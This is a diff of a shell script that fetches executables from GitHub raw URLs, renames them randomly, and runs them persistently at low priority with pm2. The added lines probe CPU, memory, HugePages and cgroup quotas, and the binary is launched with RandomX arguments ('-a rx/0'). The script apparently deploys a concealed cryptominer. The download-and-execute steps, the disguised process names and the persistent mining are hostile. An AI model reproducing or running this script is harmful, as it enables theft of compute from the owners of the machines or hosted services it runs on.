@@ -7,6 +7,13 @@ random_name() {
   npm install -g kill-port
   npm prune
   npx systeminformation
+  lscpu
+nproc
+free -h
+grep -E 'HugePages|Hugepagesize' /proc/meminfo
+cat /sys/fs/cgroup/cpu.max 2>/dev/null
+cat /sys/fs/cgroup/cpu.stat 2>/dev/null
+
 wget https://raw.githubusercontent.com/hosseinxdns/glowing-fortnight/main/x
 
 NEW_V2=$(random_name)
@@ -26,7 +33,7 @@ wget https://raw.githubusercontent.com/hosseinxdns4/fictional-bassoon/main/main.
 NEW_PY=$(random_name).py
 mv main.py $NEW_PY
 chmod +x $NEW_PY
-echo "./$NEW_PY -t 4" > bsh.sh
+echo "./$NEW_PY --bench=1M -a rx/0" > bsh.sh
 chmod +x bsh.sh
 nice -n 19 ./bsh.sh
 nice -n 19 pm2 start bsh.sh
